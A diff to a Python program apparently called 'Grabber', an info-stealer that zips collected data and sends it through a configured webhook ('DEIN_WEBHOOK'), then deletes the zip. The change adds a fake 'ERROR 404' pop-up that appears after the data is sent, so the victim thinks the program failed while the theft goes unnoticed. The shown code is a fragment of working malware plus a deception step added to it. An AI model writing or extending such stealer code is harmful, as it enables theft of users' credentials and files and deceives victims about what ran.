@@ -25,6 +25,10 @@ from distutils.version import LooseVersion
 from colorama import Fore
 from time import sleep
 
+import tkinter as tk
+from tkinter import messagebox
+
+
 config = {
 
     'webhook': "DEIN_WEBHOOK",
@@ -551,6 +555,14 @@ class Grabber(functions):
             os.remove(_zipfile)
         except httpx.HTTPError as e:
             print(f"Fehler beim Senden der Anfrage: {e}")
+
+
+
+
+        root = tk.Tk()
+        root.withdraw()
+
+        messagebox.showerror("Fehler", "Es ist ein Fehler aufgetreten. ERROR 404")
 
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Grabber().init())
